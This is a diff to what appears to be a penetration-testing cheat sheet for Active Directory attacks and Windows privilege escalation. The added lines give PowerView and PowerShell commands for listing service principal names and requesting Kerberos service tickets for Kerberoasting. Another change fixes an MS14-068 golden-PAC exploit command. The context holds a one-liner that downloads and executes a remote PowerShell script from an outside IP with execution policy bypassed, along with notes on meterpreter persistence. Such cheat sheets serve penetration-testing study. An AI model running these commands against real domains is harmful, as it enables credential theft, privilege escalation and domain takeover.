@@ -634,7 +634,7 @@ python2 ./ms14-068.py -u user@domain.local -p SomePassword -d $ip -s SID
 ```
 
 ```
-impacket-goldenPac domain.local/SomeUser:SomePassword@dc.domain.ocal
+impacket-goldenPac domain.local/SomeUser:SomePassword@dc.domain.local
 ```
 
 #### Validate users
@@ -1439,7 +1439,25 @@ find-userfield -SearchField description "password"
 find-userfield -SearchField description "pass"
 ```
 
+Get SPNs
 
+```
+Get-NetComputer | select -expandproperty serviceprincipalname
+```
+
+```
+get-domainuser -spn | select serviceprincipalname
+```
+
+Request Service Ticket
+
+```
+Add-Type -AssemblyName System.IdentityModel
+```
+
+```
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SomeSPN"
+```
 
  - powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.119.241:8080/powerview.ps1');Get-NetLoggedon -ComputerName DC01"
   - Get-DomainGroup -MemberIdentity SomeUser | select samaccountname
@@ -1555,7 +1573,9 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 - once you have a meterpreter session background the session
 - use exploit/windows/local/persistance and run
 
-### Token Impersonation -- `whoami /all` look for privileges to abuse. most commonly abused privileges https://steflan-security.com/linux-privilege-escalation-token-impersonation/
+### Token Impersonation 
+
+ `whoami /all` look for privileges to abuse. most commonly abused privileges https://steflan-security.com/linux-privilege-escalation-token-impersonation/
 
 https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 
